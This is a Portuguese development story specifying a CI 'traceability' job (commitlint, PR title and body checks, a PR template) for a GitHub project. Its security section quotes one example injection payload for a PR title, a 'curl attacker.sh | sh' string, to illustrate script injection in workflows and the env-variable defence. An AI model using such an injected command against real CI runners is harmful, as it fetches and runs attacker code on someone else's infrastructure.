---
baseline_commit: 247fafc02e567f4b22251e2e0436da80889ef7b7
---

# Story 0.5: Rastreabilidade — commits e PRs

Status: in-progress

<!-- Note: Validation is optional. Run validate-create-story for quality check before dev-story. -->

## Story

As a construtor,
I want commits convencionais e PRs ligados a Story/FR,
so that toda mudança seja auditável (pilar Auditável).

## Acceptance Criteria

1. **Given** commitlint configurado
   **When** um commit do PR foge do padrão convencional
   **Then** o job `traceability` **falha** apontando a regra violada.

2. **Given** que o merge para `main` é **squash**
   **When** o título do PR foge do padrão convencional
   **Then** o job `traceability` **falha** — o título do PR é o que vira commit na `main`, e é o que realmente protege o histórico.

3. **Given** um PR aberto
   **When** o corpo não referencia nenhuma Story nem FR
   **Then** o job `traceability` **falha** indicando o que falta.

4. **Given** um template de PR
   **When** alguém abre um PR pela interface do GitHub
   **Then** o corpo já vem com as seções que a AC #3 exige.

5. **Given** violação deliberada de cada uma das três checagens
   **When** o CI roda
   **Then** o job `traceability` **falha em cada caso**, com os demais jobs verdes — provado por execução.

## Tasks / Subtasks

- [ ] **Task 1 — commitlint** (AC: #1, #2)
  - [ ] `pnpm add -D @commitlint/cli@21.2.1 @commitlint/config-conventional@21.2.0`
  - [ ] `commitlint.config.js` estendendo `@commitlint/config-conventional` (ESM — o `package.json` tem `"type": "module"`)
  - [ ] Script `commitlint` para uso local

- [ ] **Task 2 — Job `traceability`** (AC: #1, #2, #3)
  - [ ] Novo job no `ci.yml`, **apenas** em `pull_request` (em push na `main` não há PR)
  - [ ] `fetch-depth: 0` no checkout — o commitlint precisa do range de commits
  - [ ] Passo 1: validar os commits do PR (`--from origin/main --to HEAD`)
  - [ ] Passo 2: validar o **título do PR** — o mais importante, por causa do squash
  - [ ] Passo 3: validar que o corpo referencia `Story` ou `FR-`
  - [ ] **Passar título e corpo via `env:`, nunca interpolar `${{ }}` dentro do `run:`** (ver *Segurança* abaixo)

- [ ] **Task 3 — Template de PR** (AC: #4)
  - [ ] `.github/PULL_REQUEST_TEMPLATE.md` com seções: o que muda, por quê, Story/FR referenciada, como foi verificado
  - [ ] O template deve produzir, por padrão, um corpo que **passa** na checagem da AC #3

- [ ] **Task 4 — Provar as três checagens** (AC: #5)
  - [ ] Violação de commit não-convencional → `traceability` vermelho
  - [ ] Violação de título de PR não-convencional → `traceability` vermelho
  - [ ] Violação de corpo sem Story/FR → `traceability` vermelho
  - [ ] Confirmar demais jobs **verdes** em cada caso
  - [ ] Reverter (commits listando arquivos explicitamente)

## Dev Notes

### 🔴 O ponto que muda o desenho desta story: squash merge

Todos os PRs deste projeto entram com **`--squash`**. Consequência direta:

- Os commits individuais do PR **não chegam à `main`**. Viram um só.
- **O título do PR vira a mensagem desse commit.**

Portanto, validar apenas os commits do PR — que é o que a maioria dos setups de commitlint faz — deixaria o histórico da `main` desprotegido. Um PR com commits impecáveis e título `atualiza coisas` produziria exatamente isso na `main`.

Daí a AC #2 ser separada da AC #1. **A validação do título do PR é a que realmente cumpre o pilar Auditável aqui.**

### O padrão de prova do épico gera commits `Revert "..."`

As stories 0.1–0.4 estabeleceram: commit que introduz violação → CI vermelho → `git revert`. O `git revert` gera mensagens como:

```
Revert "test: introduz violacoes deliberadas para provar os gates"
```

Isso **não** é conventional commit. Sem tratamento, o commitlint reprovaria o próprio método de trabalho do épico.

**Não é problema:** o commitlint tem ignores padrão, e um deles é exatamente `test(/^(R|r)evert (.*)/)`. Mensagens de revert são ignoradas automaticamente. **Não desabilitar `defaultIgnores`.**

### ⚠️ Segurança: script injection no workflow

Interpolar `${{ github.event.pull_request.title }}` diretamente dentro de um bloco `run:` é **vulnerabilidade conhecida**: o título é conteúdo controlável por quem abre o PR, e é substituído no script *antes* do shell executar. Um título como `"; curl attacker.sh | sh #` executaria comando arbitrário no runner.

**Sempre passar por `env:`** e referenciar como variável de shell:

```yaml
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "$PR_TITLE" | pnpm exec commitlint
```

Assim o valor entra como dado, não como código. Isso importa mais aqui do que nas stories anteriores porque é o primeiro job que consome **entrada controlada pelo usuário**.

### Estado atual do CI (pós-Story 0.4, merge `247fafc`)

`.github/workflows/ci.yml` tem **6 jobs**:

| Job | Precisa de Node? | Observação |
|---|---|---|
| `lint` | sim | `pnpm lint` |
| `typecheck` | sim | `pnpm typecheck` |
| `test` | sim | `pnpm test:coverage` + cobertura no PR |
| `arch` | sim | `pnpm arch` (dependency-cruiser) |
| `security-deps` | não | Trivy |
| `security-secrets` | não | Gitleaks (`fetch-depth: 0`) |

`permissions` global: `contents: read`. O job `test` eleva para `pull-requests: write`.

**Não existe** `.github/PULL_REQUEST_TEMPLATE.md` — verificado.

O job `traceability` **precisa** de Node (commitlint é pacote npm) e de `fetch-depth: 0`.

### Convenção de commits já em uso no repositório

Os commits do Epic 0 já seguem conventional commits — vale conferir os tipos usados para que a config não reprove o histórico existente:

| Tipo | Uso no projeto |
|---|---|
| `feat` | novas capacidades (stories 0.1–0.4) |
| `fix` | correções (`fix: Trivy nao escaneava devDependencies`) |
| `chore` | setup, configuração (`chore: commit inicial`) |
| `docs` | registro de execução das stories |
| `test` | commits de prova dos gates |

Todos estão no conjunto padrão do `@commitlint/config-conventional`. **Não é necessário customizar `type-enum`.**

O `.github/dependabot.yml` da Story 0.3 já configura `commit-message.prefix: chore` — os PRs do Dependabot vão passar.

### Armadilhas conhecidas

- **`commitlint.config.js` com `"type": "module"`.** Precisa ser ESM (`export default {...}`). Se der problema de carregamento, renomear para `.mjs` — **não** usar `module.exports`.
- **`--from origin/main` exige o ref disponível.** Com `fetch-depth: 0` o checkout traz tudo, mas `origin/main` pode não estar como ref local; usar `git fetch origin main` antes, ou o SHA base do PR (`github.event.pull_request.base.sha`).
- **Job só em `pull_request`.** Em `push` na `main` não existe título nem corpo de PR — o job falharia por referência vazia. Usar `if: github.event_name == 'pull_request'`.
- **A checagem de corpo não pode ser frouxa demais.** Procurar literalmente por `Story` ou `FR-` num corpo que sempre contém o template geraria falso verde. A regex deve exigir referência **preenchida**, não o rótulo vazio do template.
- **Template de PR não é gate.** Quem abre PR pela CLI (`gh pr create --body`) não recebe o template. Por isso a AC #3 valida o corpo — o template é conveniência, a checagem é o gate.
- **Nome do job.** `traceability` vira required check na 0.7.

### Aprendizados das Stories 0.1–0.4 (aplicar)

- **Verificar o artefato, não o exit code.** Confirmar que o commitlint realmente processou commits (contagem no output), não só que retornou 0. Cinco ferramentas já enganaram assim neste épico.
- **Isolar a reprovação.** A prova da 0.4 conseguiu `arch` vermelho com cinco jobs verdes. Repetir: cada violação deve reprovar **só** o `traceability`.
- **Commit de prova lista arquivos explicitamente**, nunca `git add -A`.
- **Registrar o que não foi provado.** Na 0.4, `no-cross-adapter` e `no-circular` ficaram declaradas mas não exercitadas, e isso está anotado. Fazer o mesmo aqui se alguma checagem não puder ser provada.

### Testing standards

Nenhum teste de produto. As "provas" são as três violações da Task 4. A suíte permanente (`tests/toolchain.test.ts`) deve seguir verde.

### Project Structure Notes

- `commitlint.config.js` (novo, raiz)
- `.github/PULL_REQUEST_TEMPLATE.md` (novo)
- `.github/workflows/ci.yml` (job `traceability`; **não reescrever**)
- `package.json` (devDependencies + script)

### References

- [Source: _bmad-output/planning-artifacts/epics.md#Story 0.5] — user story e AC original
- [Source: QUALITY-GATE.md#2] — commitlint + template de PR, pilar Auditável
- [Source: QUALITY-GATE.md#3] — "commitlint passa + PR referencia Story/FR + Biome"
- [Source: ARCHITECTURE-SPINE.md#AD-3] — auditoria com autor e origem (o análogo em runtime deste gate)
- [Source: ARCHITECTURE-SPINE.md#AD-11] — gateway de CI obrigatório
- [Source: 0-4-fronteiras-da-arquitetura-dependency-cruiser.md#Debug Log References] — padrão de isolamento da prova

## Dev Agent Record

### Agent Model Used

### Debug Log References

### Completion Notes List

### File List
